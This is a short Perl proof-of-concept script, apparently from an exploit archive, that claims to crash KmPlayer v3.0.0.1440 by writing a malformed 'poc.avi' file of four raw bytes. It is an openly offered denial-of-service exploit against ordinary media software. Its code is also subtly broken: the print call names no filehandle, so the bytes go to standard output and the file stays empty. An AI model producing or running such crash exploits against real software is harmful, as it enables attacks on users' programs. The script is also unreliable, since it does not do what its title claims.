#!/usr/bin/perl
#Title : KmPlayer v3.0.0.1440 Local Crash PoC
#Discovered By : Am!r
#Home : http://IrIsT.Ir/forum/
#tested : XP
#TNX : Alireza , C0dex , B3hz4d

my $po="\x46\x02\x00\x00";

open(C, ">:raw", "poc.avi");

print $po;

close(C);
